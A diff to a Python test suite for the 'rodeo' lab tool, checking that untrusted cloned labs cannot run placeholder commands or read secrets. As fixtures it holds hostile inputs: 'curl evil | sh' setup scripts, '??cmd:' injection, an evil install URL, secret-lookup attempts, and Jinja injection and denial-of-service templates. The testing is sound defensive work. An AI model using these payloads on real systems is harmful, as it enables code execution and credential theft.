@@ -11,7 +11,7 @@ from rodeo import config
 
 def _write_plan(tmp_path, data):
     plan = tmp_path / "rodeo-plan.yaml"
-    plan.write_text(yaml.dump(data))
+    plan.write_text(yaml.dump(data, width=10_000))
     return plan
 
 
@@ -39,131 +39,529 @@ def test_plan_overrides_defaults(tmp_path):
     assert cfg["network"]["rancher_ip"] == "192.168.122.9"  # untouched default
 
 
-def test_secret_resolution(tmp_path, monkeypatch):
+def _pw(spec):
+    return {"credentials": {"harvester_os_password": spec}}
+
+
+def _lab(tmp_path, name, data, *, trusted=False):
+    lab = tmp_path / name
+    lab.mkdir()
+    plan = _write_plan(lab, data)
+    if trusted:
+        config.trust_lab(lab)
+    return plan
+
+
+# --- modes ------------------------------------------------------------------------
+
+
+def test_secret_resolution_in_trusted_lab(tmp_path, monkeypatch):
     _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??harvester_os_password"}}
-    )
+    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
+    for mode in ("keys", "all"):
+        cfg = config.load_config(plan, secrets=mode)
+        assert cfg["credentials"]["harvester_os_password"] == "FromSecrets1"
+
+
+def test_default_mode_resolves_nothing(tmp_path, monkeypatch):
+    _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
+    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
     cfg = config.load_config(plan)
-    assert cfg["credentials"]["harvester_os_password"] == "FromSecrets1"
+    assert cfg["credentials"]["harvester_os_password"] == "??harvester_os_password"
+
+
+def test_unknown_mode_rejected(tmp_path):
+    with pytest.raises(ValueError):
+        config.load_config(tmp_path / "missing.yaml", secrets=True)
+
+
+def test_resolve_secrets_alias_is_deprecated(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("??cmd:echo FromCmd12345"), trusted=True)
+    with pytest.warns(DeprecationWarning):
+        cfg = config.load_config(plan, resolve_secrets=False)
+    assert cfg["credentials"]["harvester_os_password"] == "??cmd:echo FromCmd12345"
+    with pytest.warns(DeprecationWarning):
+        cfg = config.load_config(plan, resolve_secrets=True)
+    assert cfg["credentials"]["harvester_os_password"] == "FromCmd12345"
+
+
+@pytest.mark.parametrize("spec", ["??env:RODEO_TEST_PW", "??cmd:echo FromCmd12345"])
+def test_keys_mode_never_resolves_sources(tmp_path, monkeypatch, spec):
+    monkeypatch.setenv("RODEO_TEST_PW", "FromEnv12345")
+    plan = _lab(tmp_path, "lab", _pw(spec), trusted=True)
+    assert config.load_config(plan, secrets="keys")["credentials"]["harvester_os_password"] == spec
+
+
+# --- every form, in a trusted lab ------------------------------------------------
 
 
 def test_env_resolver(tmp_path, monkeypatch):
     monkeypatch.setenv("RODEO_TEST_PW", "FromEnv12345")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??env:RODEO_TEST_PW"}}
-    )
-    cfg = config.load_config(plan)
+    plan = _lab(tmp_path, "lab", _pw("??env:RODEO_TEST_PW"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     assert cfg["credentials"]["harvester_os_password"] == "FromEnv12345"
 
 
 def test_env_resolver_missing_fails_closed(tmp_path, monkeypatch):
     monkeypatch.delenv("RODEO_MISSING_PW", raising=False)
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??env:RODEO_MISSING_PW"}}
-    )
-    cfg = config.load_config(plan)
-    assert cfg["credentials"]["harvester_os_password"] == "??env:RODEO_MISSING_PW"
+    plan = _lab(tmp_path, "lab", _pw("??env:RODEO_MISSING_PW"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     with pytest.raises(ValueError, match="Secrets not resolved"):
         config.validate_config(cfg)
-
-
-def _trust(*sources):
-    config.save_trusted_sources(set(sources))
 
 
 def test_file_resolver(tmp_path):
     pw_file = tmp_path / "pw.txt"
     pw_file.write_text("FromFile12345\n")
-    _trust(f"??file:{pw_file}")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": f"??file:{pw_file}"}}
-    )
-    cfg = config.load_config(plan)
+    plan = _lab(tmp_path, "lab", _pw(f"??file:{pw_file}"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     assert cfg["credentials"]["harvester_os_password"] == "FromFile12345"
 
 
 def test_file_resolver_missing_fails_closed(tmp_path):
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??file:/nonexistent/pw"}}
-    )
-    cfg = config.load_config(plan)
+    plan = _lab(tmp_path, "lab", _pw("??file:/nonexistent/pw"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     with pytest.raises(ValueError, match="Secrets not resolved"):
         config.validate_config(cfg)
 
 
 def test_cmd_resolver(tmp_path):
-    _trust("??cmd:echo FromCmd12345")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??cmd:echo FromCmd12345"}}
-    )
-    cfg = config.load_config(plan)
+    plan = _lab(tmp_path, "lab", _pw("??cmd:echo FromCmd12345"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     assert cfg["credentials"]["harvester_os_password"] == "FromCmd12345"
+    config.validate_config(cfg)
 
 
 def test_cmd_resolver_failure_fails_closed(tmp_path):
-    _trust("??cmd:false")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??cmd:false"}}
-    )
-    cfg = config.load_config(plan)
+    plan = _lab(tmp_path, "lab", _pw("??cmd:false"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
     with pytest.raises(ValueError, match="Secrets not resolved"):
         config.validate_config(cfg)
 
 
-def test_untrusted_cmd_never_runs(tmp_path, capsys):
-    marker = tmp_path / "pwned"
-    spec = f"??cmd:touch {marker}"
-    plan = _write_plan(tmp_path, {"credentials": {"harvester_os_password": spec}})
-    cfg = config.load_config(plan)
-    assert not marker.exists()
-    assert cfg["credentials"]["harvester_os_password"] == spec
-    assert "rodeo trust" in capsys.readouterr().err
-    with pytest.raises(ValueError, match="rodeo trust"):
+def test_unresolved_secret_kept_and_rejected(tmp_path, monkeypatch):
+    _write_secrets(tmp_path, monkeypatch, {})
+    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
+    cfg = config.load_config(plan, secrets="all")
+    assert cfg["credentials"]["harvester_os_password"] == "??harvester_os_password"
+    with pytest.raises(ValueError, match="Secrets not resolved"):
         config.validate_config(cfg)
 
 
-def test_untrusted_cmd_outside_credentials_never_runs(tmp_path):
+def test_leftover_placeholder_outside_credentials_rejected(tmp_path):
+    plan = _lab(tmp_path, "lab", {**_pw("Secret123"), "registry": {"token": "??cmd:false"}},
+                trusted=True)
+    cfg = config.load_config(plan, secrets="all")
+    with pytest.raises(ValueError, match="registry.token"):
+        config.validate_config(cfg)
+
+
+def test_key_only_seeded_lab_deploys_without_tty(tmp_path, monkeypatch):
+    """A lab rodeo seeds from a bundled profile is trusted at seed time: no TTY, no rodeo trust."""
+    from rodeo.labseed import seed_lab
+    from rodeo.secretgen import ensure_plan_secrets, ensure_secrets_file
+
+    monkeypatch.setattr("sys.stdin", None)
+    lab = seed_lab("rancher", tmp_path / "r1")
+    ensure_secrets_file(tmp_path / ".rodeo" / "secrets.yaml")
+    plan = yaml.safe_load((lab / "rodeo-plan.yaml").read_text())
+    ensure_plan_secrets(plan, lab_path=lab / config.LAB_SECRETS_FILE)
+    cfg = config.load_config("rodeo-plan.yaml", config_dir=str(lab), secrets="all")
+    config.validate_config(cfg)
+
+
+# --- untrusted labs ----------------------------------------------------------------
+
+
+def test_untrusted_cloned_lab_refuses_all_and_runs_nothing(tmp_path):
+    """Attack: a cloned lab with ??cmd: anywhere; a write load refuses, nothing runs."""
     marker = tmp_path / "pwned"
-    plan = _write_plan(tmp_path, {"registry": {"token": f"??cmd:touch {marker}"}})
-    config.load_config(plan)
+    plan = _lab(tmp_path, "clone",
+                {**_pw("Secret123"), "registry": {"token": f"??cmd:touch {marker}"}})
+    with pytest.raises(config.ConfigError, match="rodeo trust"):
+        config.load_config(plan, secrets="all")
+    for mode in ("off", "keys"):
+        config.load_config(plan, secrets=mode)
     assert not marker.exists()
 
 
-def test_untrusted_file_not_read(tmp_path):
-    pw_file = tmp_path / "pw.txt"
-    pw_file.write_text("FromFile12345\n")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": f"??file:{pw_file}"}}
-    )
+def test_untrusted_lab_keys_mode_cannot_read_global_secrets(tmp_path, monkeypatch):
+    """Attack: credentials.x: ??aws_secret_access_key in a cloned plan must not pull
+    a global secret into story render or a preflight."""
+    _write_secrets(tmp_path, monkeypatch, {"aws_secret_access_key": "GLOBAL-SECRET"})
+    plan = _lab(tmp_path, "clone", _pw("??aws_secret_access_key"))
+    cfg = config.load_config(plan, secrets="keys")
+    assert cfg["credentials"]["harvester_os_password"] == "??aws_secret_access_key"
+
+
+def test_untrusted_lab_keys_mode_reads_its_own_secrets(tmp_path):
+    plan = _lab(tmp_path, "clone", _pw("??harvester_os_password"))
+    (plan.parent / config.LAB_SECRETS_FILE).write_text("harvester_os_password: LabOwn123\n")
+    cfg = config.load_config(plan, secrets="keys")
+    assert cfg["credentials"]["harvester_os_password"] == "LabOwn123"
+
+
+@pytest.mark.parametrize("change", ["plan", "definition", "custom", "custom-new"])
+def test_changed_lab_is_untrusted_again(tmp_path, change):
+    plan = _lab(tmp_path, "lab", _pw("??cmd:echo ok"))
+    lab = plan.parent
+    (lab / "definition.yaml").write_text("nodes: []\n")
+    (lab / "custom" / "scripts").mkdir(parents=True)
+    (lab / "custom" / "scripts" / "10-setup.sh").write_text("echo hi\n")
+    config.trust_lab(lab)
+    assert config.is_lab_trusted(lab)
+    if change == "plan":
+        plan.write_text(plan.read_text() + "registry:\n  token: '??cmd:touch /tmp/x'\n")
+    elif change == "definition":
+        (lab / "definition.yaml").write_text("nodes: [evil]\n")
+    elif change == "custom":
+        (lab / "custom" / "scripts" / "10-setup.sh").write_text("curl evil | sh\n")
+    else:
+        (lab / "custom" / "scripts" / "20-more.sh").write_text("id\n")
+    assert not config.is_lab_trusted(lab)
+    with pytest.raises(config.ConfigError, match="not trusted"):
+        config.load_config(plan, secrets="all")
+
+
+def test_trust_survives_noop_reload(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("??cmd:echo ok"), trusted=True)
+    for _ in range(2):
+        assert config.load_config(plan, secrets="all")["credentials"]["harvester_os_password"] == "ok"
+    assert config.is_lab_trusted(plan.parent)
+
+
+def test_trust_is_per_lab_dir(tmp_path):
+    marker = tmp_path / "ran"
+    data = _pw(f"??cmd:touch {marker} && echo ok")
+    _lab(tmp_path, "lab-a", data, trusted=True)
+    plan_b = _lab(tmp_path, "lab-b", data)  # identical content, other directory
+    with pytest.raises(config.ConfigError, match="not trusted"):
+        config.load_config(plan_b, secrets="all")
+    assert not marker.exists()
+
+
+def test_check_mode_untrusted_lab_fails(tmp_path):
+    plan = _lab(tmp_path, "clone", _pw("Secret123"))
     cfg = config.load_config(plan)
-    assert cfg["credentials"]["harvester_os_password"] == f"??file:{pw_file}"
+    with pytest.raises(config.ConfigError, match="rodeo trust"):
+        config.validate_config(cfg, check=True)
 
 
-def test_trust_is_per_exact_string(tmp_path):
-    marker = tmp_path / "pwned"
-    _trust("??cmd:echo ok")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": f"??cmd:echo ok; touch {marker}"}}
-    )
-    config.load_config(plan)
+def test_check_mode_defers_resolvable_placeholders(tmp_path, monkeypatch):
+    _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
+    plan = _lab(tmp_path, "lab", {
+        "credentials": {"harvester_os_password": "??harvester_os_password",
+                        "rancher_admin_password": "??env:RODEO_X",
+                        "harvester_token": "??cmd:echo t"}}, trusted=True)
+    cfg = config.load_config(plan)
+    config.validate_config(cfg, check=True)
+    with pytest.raises(ValueError, match="Secrets not resolved"):
+        config.validate_config(cfg)
+
+
+def test_check_mode_defers_keys_up_would_generate(tmp_path):
+    """A fresh lab: up generates its ??keys, so plan must not exit 2 for them."""
+    plan = _lab(tmp_path, "lab", _pw("??never_set_yet"), trusted=True)
+    config.validate_config(config.load_config(plan), check=True)
+
+
+def test_check_mode_fails_missing_operator_secret(tmp_path):
+    plan = _lab(tmp_path, "lab", {**_pw("??scc_regcode"), "operator_secrets": ["scc_regcode"]},
+                trusted=True)
+    with pytest.raises(ValueError, match="Secrets not resolved"):
+        config.validate_config(config.load_config(plan), check=True)
+
+
+def test_lab_trusted_flag_cannot_be_forged(tmp_path):
+    plan = _lab(tmp_path, "clone", _pw("Secret123"))
+    with pytest.raises(config.ConfigError, match="may not set"):
+        config.load_config(plan, params=(f"{config.LAB_TRUSTED_KEY}=true",))
+    cfg = config.load_config(plan, secrets="keys")
+    assert cfg[config.LAB_TRUSTED_KEY] is False
+
+
+@pytest.mark.parametrize("denied", config.PARAM_DENYLIST)
+def test_param_denylist_every_entry(tmp_path, denied):
+    """Code-bearing keys can't be set from -P or --paramfile (agent input via MCP)."""
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    with pytest.raises(config.ConfigError, match="may not set"):
+        config.load_config(plan, params=(f"{denied}=x",))
+    pf = tmp_path / "pf.yaml"
+    node: dict = "x"
+    for part in reversed(denied.split(".")):
+        node = {part: node}
+    pf.write_text(yaml.dump(node))
+    with pytest.raises(config.ConfigError, match="may not set"):
+        config.load_config(plan, paramfile=pf)
+
+
+@pytest.mark.parametrize("entry", ["ansible.path=/tmp/x", "ansible={path: /tmp/x}",
+                                   "provider={install_url: 'https://evil/x.sh'}"])
+def test_param_denylist_parent_and_nested_forms(tmp_path, entry):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    with pytest.raises(config.ConfigError, match="may not set"):
+        config.load_config(plan, params=(entry,))
+
+
+def test_param_denylist_leaves_ordinary_keys(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    cfg = config.load_config(plan, params=("provider.region=eu-north-1", "content.facts.x=1"))
+    assert cfg["provider"]["region"] == "eu-north-1"
+
+
+def test_config_outside_config_dir_refused_on_write(tmp_path):
+    plan = _lab(tmp_path, "plans", _pw("Secret123"), trusted=True)
+    other = tmp_path / "cfgdir"
+    other.mkdir()
+    (other / "definition.yaml").write_text("nodes: []\n")
+    config.trust_lab(other)
+    with pytest.raises(config.ConfigError, match="outside --config-dir"):
+        config.load_config(plan, config_dir=other, secrets="all")
+
+
+@pytest.mark.parametrize("path", ["content/scripts/x.sh", "guide/index.html", ".labinabox/lab.json",
+                                  "logs/x", ".builder-deploy.log", "rodeo-secrets.env",
+                                  ".git/HEAD", "custom/__pycache__/a.pyc"])
+def test_rodeo_written_state_does_not_untrust(tmp_path, path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    target = plan.parent / path
+    target.parent.mkdir(parents=True, exist_ok=True)
+    target.write_text("written by rodeo\n")
+    (plan.parent / config.LAB_SECRETS_FILE).write_text("k: v\n")
+    assert config.is_lab_trusted(plan.parent)
+
+
+@pytest.mark.parametrize("path", ["manifests/x.yaml", "helm/values.yaml", "certs/ca.pem",
+                                  "story/01.md", "host1/apply.yaml", "workshop.yaml"])
+def test_any_lab_file_change_untrusts(tmp_path, path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    target = plan.parent / path
+    target.parent.mkdir(parents=True, exist_ok=True)
+    target.write_text("new\n")
+    assert not config.is_lab_trusted(plan.parent)
+
+
+def test_symlinked_file_is_hashed_as_a_link(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"))
+    outside = tmp_path / "outside.sh"
+    outside.write_text("echo one\n")
+    (plan.parent / "custom").mkdir()
+    (plan.parent / "custom" / "run.sh").symlink_to(outside)
+    config.trust_lab(plan.parent)
+    outside.write_text("echo two\n")  # target content is not followed...
+    assert config.is_lab_trusted(plan.parent)
+    (plan.parent / "custom" / "run.sh").unlink()
+    (plan.parent / "custom" / "run.sh").symlink_to(tmp_path / "other.sh")  # ...the link is
+    assert not config.is_lab_trusted(plan.parent)
+
+
+def test_trust_write_hands_file_back_to_invoking_user(tmp_path, monkeypatch):
+    calls = []
+    monkeypatch.setattr("rodeo.paths.fix_invoking_ownership", lambda: calls.append(1))
+    _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    assert calls
+
+
+# --- auto-trust only for what rodeo wrote ------------------------------------------
+
+
+def test_seed_into_empty_dir_is_trusted(tmp_path):
+    from rodeo.labseed import seed_lab
+
+    lab = seed_lab("rancher", tmp_path / "fresh")
+    assert config.is_lab_trusted(lab)
+
+
+def test_seed_into_clone_is_not_trusted(tmp_path):
+    """rodeo up --profile X --dir <clone>: existing files are kept, so no auto-trust."""
+    from rodeo.labseed import seed_lab
+
+    clone = tmp_path / "clone"
+    (clone / "custom" / "scripts").mkdir(parents=True)
+    (clone / "custom" / "scripts" / "10-evil.sh").write_text("curl evil | sh\n")
+    seed_lab("rancher", clone)
+    assert not config.is_lab_trusted(clone)
+
+
+def test_seed_from_untrusted_custom_profile_is_not_trusted(tmp_path, monkeypatch):
+    from rodeo import labseed
+
+    src = tmp_path / "imported"
+    src.mkdir()
+    (src / "rodeo-plan.yaml").write_text("type: rancher\nname: imported\n")
+    monkeypatch.setattr(labseed, "resolve_profile_source", lambda name: src)
+    monkeypatch.setattr(labseed, "profile_kind", lambda name: "custom")
+    lab = labseed.seed_lab("imported", tmp_path / "lab")
+    assert not config.is_lab_trusted(lab)
+    config.trust_lab(src)
+    lab2 = labseed.seed_lab("imported", tmp_path / "lab2")
+    assert config.is_lab_trusted(lab2)
+
+
+def test_init_into_non_empty_dir_is_not_trusted(tmp_path):
+    from click.testing import CliRunner
+
+    from rodeo.commands.init_cmd import init_cmd
+
+    fresh = tmp_path / "fresh"
+    clone = tmp_path / "clone"
+    clone.mkdir()
+    (clone / "definition.yaml").write_text("nodes: [evil]\n")
+    for d in (fresh, clone):
+        result = CliRunner().invoke(init_cmd, [str(d)])
+        assert result.exit_code == 0, result.output
+    assert config.is_lab_trusted(fresh)
+    assert not config.is_lab_trusted(clone)
+
+
+# --- -P / --paramfile input hygiene ------------------------------------------------
+
+
+@pytest.mark.parametrize("entry", [
+    "versions.harvester=??env:SOME_SECRET",
+    "versions.harvester=??scc_regcode",
+    "credentials.harvester_os_password=??cmd:echo ok",
+    "tok={{ 7 * 7 }}",
+    "tok={% if true %}x{% endif %}",
+    "tok=a\nb",
+    "network={vip: '??env:X'}",
+])
+def test_param_with_placeholder_or_template_rejected(tmp_path, entry):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    with pytest.raises(config.ConfigError, match="may not contain"):
+        config.load_config(plan, params=(entry,))
+
+
+def test_paramfile_with_placeholder_at_depth_rejected(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    pf = tmp_path / "pf.yaml"
+    pf.write_text(yaml.dump({"registry": {"mirrors": [{"token": "??env:SOME_SECRET"}]}}))
+    with pytest.raises(config.ConfigError, match="registry.mirrors"):
+        config.load_config(plan, paramfile=pf)
+
+
+def test_param_into_template_variable_rejected(tmp_path):
+    """Attack: -P/--paramfile scalars feed Jinja; a gated string can't arrive that way."""
+    marker = tmp_path / "ran"
+    lab = tmp_path / "lab"
+    lab.mkdir()
+    plan = lab / "rodeo-plan.yaml"
+    plan.write_text("parameters:\n  tok: none\n"
+                    "credentials:\n  harvester_os_password: Secret123\n"
+                    "registry:\n  token: \"{{ tok }}\"\n")
+    config.trust_lab(lab)
+    with pytest.raises(config.ConfigError, match="may not contain"):
+        config.load_config(plan, params=(f"tok=??cmd:touch {marker}",), secrets="all")
+    pf = tmp_path / "pf.yaml"
+    pf.write_text(yaml.dump({"tok": f"??cmd:touch {marker}"}))
+    with pytest.raises(config.ConfigError, match="may not contain"):
+        config.load_config(plan, paramfile=pf, secrets="all")
     assert not marker.exists()
 
 
-def test_trusted_sources_file_is_private(tmp_path):
-    _trust("??cmd:echo ok")
-    path = tmp_path / ".rodeo" / "trusted-sources.yaml"
+def test_plain_params_still_work(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    cfg = config.load_config(plan, params=("network.vip=10.9.9.9", "name=demo-1"), secrets="all")
+    assert cfg["network"]["vip"] == "10.9.9.9"
+
+
+# --- trust file ------------------------------------------------------------------
+
+
+def test_trusted_labs_file_is_private(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
     assert path.stat().st_mode & 0o777 == 0o600
-    assert config.load_trusted_sources() == {"??cmd:echo ok"}
+    assert config.load_trusted_labs() == {str(plan.parent.resolve()): config.lab_fingerprint(plan.parent)}
 
 
-def test_load_config_without_resolving(tmp_path):
-    _trust("??cmd:echo FromCmd12345")
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??cmd:echo FromCmd12345"}}
-    )
-    cfg = config.load_config(plan, resolve_secrets=False)
-    assert cfg["credentials"]["harvester_os_password"] == "??cmd:echo FromCmd12345"
+def test_trust_tightens_existing_file_mode(tmp_path):
+    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text("{}\n")
+    path.chmod(0o644)
+    _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    assert path.stat().st_mode & 0o777 == 0o600
+
+
+def test_revoke_keeps_other_labs(tmp_path):
+    a = _lab(tmp_path, "a", _pw("Secret123"), trusted=True).parent
+    b = _lab(tmp_path, "b", _pw("Secret123"), trusted=True).parent
+    assert config.revoke_lab(a)
+    assert not config.is_lab_trusted(a)
+    assert config.is_lab_trusted(b)
+
+
+@pytest.mark.parametrize("body", ["{not: [valid", "just a string\n", "- /lab\n", "/lab: [x]\n"])
+def test_corrupt_trust_file_raises(tmp_path, body):
+    """Attack: a corrupt or non-mapping trust file is an error, not "trust nothing"."""
+    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(body)
+    with pytest.raises(config.ConfigError):
+        config.load_trusted_labs()
+    plan = _lab(tmp_path, "lab", _pw("Secret123"))
+    with pytest.raises(config.ConfigError):
+        config.load_config(plan, secrets="all")
+
+
+def test_trust_file_symlink_refused(tmp_path):
+    real = tmp_path / "elsewhere.yaml"
+    real.write_text("{}\n")
+    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.symlink_to(real)
+    with pytest.raises(config.ConfigError):
+        config.load_trusted_labs()
+    with pytest.raises(config.ConfigError):
+        config.trust_lab(tmp_path)
+
+
+def test_keep_trust_follows_rodeos_own_plan_edits(tmp_path):
+    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
+    with config.keep_trust(plan.parent):
+        plan.write_text(plan.read_text() + "deployment_target: aws\n")
+    assert config.is_lab_trusted(plan.parent)
+    untrusted = _lab(tmp_path, "clone", _pw("Secret123"))
+    with config.keep_trust(untrusted.parent):
+        untrusted.write_text(untrusted.read_text() + "name: x\n")
+    assert not config.is_lab_trusted(untrusted.parent)
+
+
+# --- templates ------------------------------------------------------------------
+
+
+def test_template_range_overflow_is_config_error(tmp_path):
+    import time
+
+    plan = tmp_path / "rodeo-plan.yaml"
+    plan.write_text("network:\n  vip: \"{% for i in range(10**9) %}x{% endfor %}\"\n")
+    start = time.monotonic()
+    with pytest.raises(config.ConfigError, match="range"):
+        config.load_config(plan)
+    assert time.monotonic() - start < 5
+
+
+def test_no_plain_jinja_environment_in_rodeo():
+    """Every template over lab/plan/workshop text uses config.sandboxed_jinja_env()."""
+    import re
+
+    root = Path(config.__file__).parent
+    allowlist: set[str] = set()
+    offenders = [
+        str(f.relative_to(root)) for f in root.rglob("*.py")
+        if re.search(r"jinja2\.Environment\(|[^.\w]Environment\(", f.read_text())
+        and str(f.relative_to(root)) not in allowlist
+    ]
+    assert offenders == []
+
+
+def test_loaded_config_does_not_share_base_defaults(tmp_path):
+    """With secrets="off" no walk copies the tree, so a caller mutating cfg
+    (finalize_cfg does, for lab-in-a-box) must not change the next load."""
+    cfg = config.load_config(tmp_path / "missing.yaml")
+    cfg["network"]["dns_domain"] = "i1.rodeo.lab"
+    assert config.load_config(tmp_path / "missing.yaml")["network"]["dns_domain"] == "rodeo.lab"
 
 
 def test_template_sandbox_blocks_python_internals(tmp_path):
@@ -178,16 +576,6 @@ def test_template_parameters_still_render(tmp_path):
     plan.write_text("parameters:\n  vip: 10.9.9.9\nnetwork:\n  vip: \"{{ vip | upper }}\"\n")
     assert config.load_config(plan)["network"]["vip"] == "10.9.9.9"
 
-
-def test_unresolved_secret_kept_and_rejected(tmp_path, monkeypatch):
-    _write_secrets(tmp_path, monkeypatch, {})
-    plan = _write_plan(
-        tmp_path, {"credentials": {"harvester_os_password": "??harvester_os_password"}}
-    )
-    cfg = config.load_config(plan)
-    assert cfg["credentials"]["harvester_os_password"] == "??harvester_os_password"
-    with pytest.raises(ValueError, match="Secrets not resolved"):
-        config.validate_config(cfg)
 
 
 @pytest.mark.parametrize("bad", [None, "", "   ", "CHANGE_ME"])
@@ -243,7 +631,7 @@ def test_letsencrypt_unresolved_email_rejected():
         "credentials": {"harvester_os_password": "Secret123"},
         "rancher_tls": {"source": "letsEncrypt", "email": "??rancher_letsencrypt_email"},
     }
-    with pytest.raises(ValueError, match="real address"):
+    with pytest.raises(ValueError, match="rancher_tls.email"):
         config.validate_config(cfg)
 
 
